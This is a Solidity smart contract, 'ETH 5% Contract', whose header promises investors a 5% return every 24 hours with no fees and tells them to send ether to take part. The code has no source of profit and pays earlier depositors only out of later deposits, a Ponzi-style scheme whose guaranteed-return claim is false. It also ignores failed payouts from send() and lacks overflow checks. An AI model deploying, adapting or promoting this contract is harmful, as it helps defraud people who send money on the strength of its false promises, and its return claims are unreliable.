pragma solidity ^0.4.24;

/**
 *
 * ETH 5% Contract
 *  - GAIN 5% PER 24 HOURS (every 5900 blocks)
 *  - No fees on your investment 
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a) Claim your profit by sending 0 ether transaction
 *  OR
 *  2b) Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 */
contract FreeInvestment5 {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 5/100 * (block.number - atBlock[msg.sender]) / 5900;


            // send calculated amount of ether directly to sender
            address sender = msg.sender;
            sender.send(amount);
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}